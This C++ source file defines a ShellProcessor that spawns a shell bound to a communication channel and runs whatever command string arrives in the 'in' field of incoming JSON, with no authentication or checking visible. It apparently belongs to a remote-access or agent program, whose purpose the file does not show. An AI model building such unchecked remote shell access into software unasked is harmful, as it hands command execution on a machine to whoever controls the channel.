#include "shell_cmd.hpp"

ShellProcessor::ShellProcessor(Channel *channel) {
    this->shell.setChannel(channel);
    this->shell.spawnShell();
}


std::string ShellProcessor::commandName() {
    return "shell";
}


void ShellProcessor::processCommand(Channel *channel, json_object *data) {
    json_object *input;

    if (json_object_object_get_ex(data, "in", &input)) {
        const char* cmdString = json_object_get_string(input);

        std::cout << "Got command of " << cmdString << std::endl;

        this->shell.runCommand(std::string(cmdString));
    }
}
